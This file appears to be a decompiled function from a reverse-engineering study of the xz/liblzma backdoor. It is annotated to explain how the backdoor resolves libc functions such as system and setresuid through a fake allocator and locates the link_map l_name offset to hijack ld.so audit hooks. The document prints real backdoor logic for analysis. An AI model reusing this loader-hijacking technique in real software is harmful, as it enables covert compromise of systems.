// /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name_offsets.c
// Function: find_link_map_l_name_offsets @ 0x104080
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_name_offsets(backdoor_data_handle_t * data_handle, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Resolves the libc/libcrypto imports needed for the ld.so audit-hook pivot and recovers the `link_map` offsets used to patch `l_name`.
 * It routes each lookup through the fake liblzma allocator (plus a `secret_data_append_bits_from_addr_or_ret` breadcrumb) to resolve `exit`, `setlogmask`, `setresgid`,
 * `setresuid`, `system`, `shutdown`, and libcrypto’s `BN_num_bits`. To locate `l_name` it bounds-checks `_dl_audit_preinit`, scans liblzma’s live `link_map`
 * for the stored GNU_RELRO vaddr+size tuple, and then searches the prefix fields for a self-relative pointer that lands just past that tuple (the inferred libname
 * buffer). The inferred buffer offset becomes `*libname_offset`, while the pointer-field’s address yields the `l_name` slot offset that is reused to populate
 * `hooks->ldso_ctx.libcrypto_l_name`. As a sanity check it requires both `_dl_audit_preinit` and `_dl_audit_symbind_alt` to reference the same offset via LEA
 * before accepting the result.
 */

#include "xzre_types.h"

BOOL find_link_map_l_name_offsets
               (backdoor_data_handle_t *data_handle,ptrdiff_t *libname_offset,
               backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  libc_imports_t *libc_imports;
  elf_info_t *ldso_image;
  link_map *candidate_name_ptr;
  dl_audit_symbind_alt_fn code_start;
  BOOL status_ok;
  ptrdiff_t l_name_slot_offset;
  // AutoDoc: Log the recon step through the secret-data channel so later telemetry can tie GOT patches back to this probe.
  lzma_allocator *allocator;
  pfn_exit_t exit_fn;
  pfn_setlogmask_t setlogmask_fn;
  pfn_setresgid_t setresgid_fn;
  lzma_allocator *libcrypto_allocator;
  Elf64_Sym *audit_preinit_symbol;
  pfn_BN_num_bits_t bn_num_bits_fn;
  uchar *audit_sym_start;
  pfn_setresuid_t setresuid_fn;
  pfn_system_t system_fn;
  pfn_shutdown_t shutdown_fn;
  link_map *best_name_ptr_slot;
  link_map *best_name_ptr;
  u64 displacement;
  link_map *snapshot_slot;
  link_map *name_ptr_upper_bound;
  link_map *snapshot_cursor;
  
  status_ok = secret_data_append_bits_from_addr_or_ret
                    ((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
  if (status_ok != FALSE) {
    libc_imports = imported_funcs->libc;
    snapshot_cursor = data_handle->runtime_data->liblzma_link_map;
    // AutoDoc: Route libc imports through the attacker-controlled allocator so `lzma_alloc` lands on the right PLT offsets.
    allocator = get_fake_lzma_allocator();
    allocator->opaque = data_handle->cached_elf_handles->libc;
    // AutoDoc: Each `lzma_alloc` call reuses the fake allocator offsets to resolve the target libc symbol and bump the import counter.
    exit_fn = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
    libc_imports->exit = exit_fn;
    if (exit_fn != (pfn_exit_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    setlogmask_fn = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
    libc_imports->setlogmask = setlogmask_fn;
    if (setlogmask_fn != (pfn_setlogmask_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    setresgid_fn = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
    libc_imports->setresgid = setresgid_fn;
    if (setresgid_fn != (pfn_setresgid_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    libcrypto_allocator = get_fake_lzma_allocator();
    ldso_image = data_handle->cached_elf_handles->ldso;
    libcrypto_allocator->opaque = data_handle->cached_elf_handles->libcrypto;
    // AutoDoc: Only proceed when ld.so exposes `_dl_audit_preinit`; its body contains the LEA we pattern-match later.
    audit_preinit_symbol = elf_gnu_hash_lookup_symbol(ldso_image,STR_dl_audit_preinit,0);
    if (audit_preinit_symbol != (Elf64_Sym *)0x0) {
      bn_num_bits_fn = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,libcrypto_allocator);
      imported_funcs->BN_num_bits = bn_num_bits_fn;
      if (bn_num_bits_fn != (pfn_BN_num_bits_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      ldso_image = data_handle->cached_elf_handles->ldso;
      audit_sym_start = ldso_image->elfbase->e_ident + audit_preinit_symbol->st_value;
      // AutoDoc: Clamp the `_dl_audit_preinit` span to mapped ld.so pages so bogus symbol data cannot trick the search.
      status_ok = elf_vaddr_range_has_pflags(ldso_image,audit_sym_start,audit_preinit_symbol->st_size,4);
      snapshot_slot = snapshot_cursor + 0x960;
      if (status_ok != FALSE) {
LAB_001041f0:
        if (snapshot_cursor != snapshot_slot) {
          ldso_image = data_handle->cached_elf_handles->liblzma;
          // AutoDoc: Scan the live liblzma `link_map` until the stored GNU_RELRO vaddr+size tuple surfaces; this anchors the tail layout for the running glibc build.
          if ((*(u64 *)snapshot_cursor != ldso_image->gnurelro_vaddr) ||
             (*(u64 *)(snapshot_cursor + 8) != ldso_image->gnurelro_memsize)) goto LAB_001041ec;
          best_name_ptr_slot = (link_map *)0x0;
          best_name_ptr = (link_map *)0xffffffffffffffff;
          // AutoDoc: Search the `link_map` prefix for the smallest self-relative pointer that lands just past the RELRO tuple; treat it as the libname buffer pointer.
          for (snapshot_slot = data_handle->runtime_data->liblzma_link_map; snapshot_slot < snapshot_cursor + 0x18;
              snapshot_slot = snapshot_slot + 8) {
            candidate_name_ptr = *(link_map **)snapshot_slot;
            if (snapshot_cursor + 0x18 <= candidate_name_ptr) {
              name_ptr_upper_bound = best_name_ptr;
              if (snapshot_cursor + 0x68 <= best_name_ptr) {
                name_ptr_upper_bound = snapshot_cursor + 0x68;
              }
              if (candidate_name_ptr < name_ptr_upper_bound) {
                best_name_ptr_slot = snapshot_slot;
                best_name_ptr = candidate_name_ptr;
              }
            }
          }
          if (best_name_ptr != (link_map *)0xffffffffffffffff) {
            allocator->opaque = data_handle->cached_elf_handles->libc;
            setresuid_fn = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
            libc_imports->setresuid = setresuid_fn;
            if (setresuid_fn != (pfn_setresuid_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            snapshot_cursor = data_handle->runtime_data->liblzma_link_map;
            // AutoDoc: Convert the inferred libname buffer pointer into an offset from the `link_map` base; this becomes `*libname_offset`.
            displacement = (long)best_name_ptr - (long)snapshot_cursor;
            // AutoDoc: Compute the offset of the `l_name` pointer slot so we can address it inside libcrypto’s `link_map` as well.
            l_name_slot_offset = (int)snapshot_cursor - (int)best_name_ptr_slot;
            if (snapshot_cursor <= best_name_ptr_slot) {
              l_name_slot_offset = (int)best_name_ptr_slot - (int)snapshot_cursor;
            }
            // AutoDoc: Cache the address of libcrypto’s `l_name` slot so stage two can swap it to the forged basename buffer and restore it later.
            (hooks->ldso_ctx).libcrypto_l_name =
                 (char **)(data_handle->runtime_data->libcrypto_link_map + l_name_slot_offset);
            // AutoDoc: Require `_dl_audit_preinit` to reference the inferred libname offset via LEA before trusting the layout.
            status_ok = find_lea_with_displacement
                              (audit_sym_start,audit_sym_start + audit_preinit_symbol->st_size,displacement);
            if (status_ok == FALSE) {
              return FALSE;
            }
            // AutoDoc: Grab `_dl_audit_symbind_alt`’s entry point so the second LEA search runs against its relocated body.
            code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
            // AutoDoc: Mirror the LEA search inside `_dl_audit_symbind_alt` to ensure both audit paths agree on the inferred libname offset.
            status_ok = find_lea_with_displacement
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                               displacement);
            if (status_ok == FALSE) {
              return FALSE;
            }
            allocator->opaque = data_handle->cached_elf_handles->libc;
            system_fn = (pfn_system_t)lzma_alloc(0x9f8,allocator);
            libc_imports->system = system_fn;
            if (system_fn != (pfn_system_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            shutdown_fn = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
            libc_imports->shutdown = shutdown_fn;
            if (shutdown_fn != (pfn_shutdown_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            libcrypto_allocator->opaque = data_handle->cached_elf_handles->libcrypto;
            *libname_offset = displacement;
            return TRUE;
          }
        }
      }
      lzma_free(imported_funcs->BN_num_bits,libcrypto_allocator);
    }
  }
  return FALSE;
LAB_001041ec:
  snapshot_cursor = snapshot_cursor + 8;
  goto LAB_001041f0;
}

